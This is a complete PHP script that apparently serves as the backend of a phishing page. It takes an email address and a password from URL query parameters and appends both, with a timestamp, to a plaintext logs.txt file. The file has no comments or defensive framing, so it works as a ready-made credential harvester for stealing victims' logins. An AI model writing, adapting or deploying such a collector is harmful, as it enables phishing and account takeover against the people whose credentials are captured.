<?php
$username = $_GET["email"];
$password = $_GET["pass"];
$date = date("d-m-y h:i:s");

file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND);
file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND);
file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND);
?>